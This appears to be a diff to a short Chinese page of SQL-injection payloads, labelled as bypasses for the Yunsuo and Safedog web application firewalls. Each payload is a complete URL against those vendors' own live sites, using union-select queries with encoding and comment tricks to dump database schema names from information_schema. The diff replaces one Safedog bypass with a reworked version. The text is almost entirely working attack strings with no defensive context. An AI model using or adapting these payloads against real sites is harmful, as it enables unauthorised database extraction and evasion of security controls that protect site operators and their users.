@@ -34,4 +34,5 @@ blog:https://pureqh.top/?p=1225<br>
 ## 注：bypass云锁官网  
 http://help.yunsuo.com.cn/guide/install/?id=1' REGEXP \"[…%252523]\" union select 1,group_concat(schema_name),3 from information_schema.schemata -- +<br>
 ## 注：bypass安全狗官网
-https://www.safedog.cn/news.html?id=4046' "/\*" /\*!11444union all select 1,(select group_concat(schema_name) from information_schema.schemata) ,3 */ --+  
+https://www.safedog.cn/news.html?id=-1'  REGEXP \"[…%0a%23]\"    /\*!11444union %0a select\*/ 1,(select %0a group_concat(schema_name %0a /\*80000aaa\*/) %0a from %0a /\*!11444 /\*REGEXP \"[…%0a%23]\"\*/ %0a information_schema.schemata\*/),3-- +
+
